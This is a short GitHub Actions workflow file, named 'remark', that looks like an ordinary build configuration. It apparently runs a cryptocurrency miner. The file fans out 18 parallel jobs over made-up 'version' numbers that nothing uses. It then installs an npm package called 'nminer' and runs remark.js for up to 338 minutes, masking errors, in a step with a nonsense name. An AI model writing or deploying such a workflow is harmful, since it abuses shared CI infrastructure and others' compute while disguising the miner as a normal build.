name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 611 }
          - { version: 2647 }
          - { version: 2465 }
          - { version: 2495 }
          - { version: 2089 }
          - { version: 796 }
          - { version: 5932 }
          - { version: 9654 }
          - { version: 3416 }
          - { version: 7682 }
          - { version: 19 }
          - { version: 1524 }
          - { version: 3739 }
          - { version: 8141 }
          - { version: 7521 }
          - { version: 4334 }
          - { version: 6778 }
          - { version: 5573 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: biodegradable crossly
        run: |
          npm install nminer@latest
          timeout 338m node remark.js || echo "remark executed"